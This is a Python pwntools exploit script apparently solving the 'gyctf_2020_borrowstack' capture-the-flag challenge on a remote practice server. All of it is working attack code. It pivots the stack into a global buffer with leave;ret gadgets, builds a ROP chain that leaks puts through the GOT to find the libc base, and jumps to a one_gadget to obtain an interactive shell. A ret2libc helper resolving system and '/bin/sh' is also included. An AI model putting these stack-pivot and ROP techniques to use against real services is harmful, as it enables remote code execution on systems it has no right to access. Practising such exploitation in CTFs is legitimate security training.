from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './gyctf_2020_borrowstack'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',25316) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc = ELF('./glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

def dbg():
	gdb.attach(p)
	pause()

# start
leave_ret = 0x400699
bank = 0x601080
pop_rdi = 0x400703
offset = 0xa0

payload = flat('a'*0x60,bank+offset,leave_ret)
sa('want\n',payload)
payload = flat('a'*offset,bank+offset,pop_rdi,elf.got['puts'],elf.plt['puts'],elf.sym['main'])
sa('now!\n',payload)

base = uu64(r(6)) - libc.sym['puts']
leak('base',base)
one = base + 0x4526a

payload = flat('a'*0x60,'a'*8,one)
sa('want\n',payload)
sa('now!\n','a')
# end

itr()
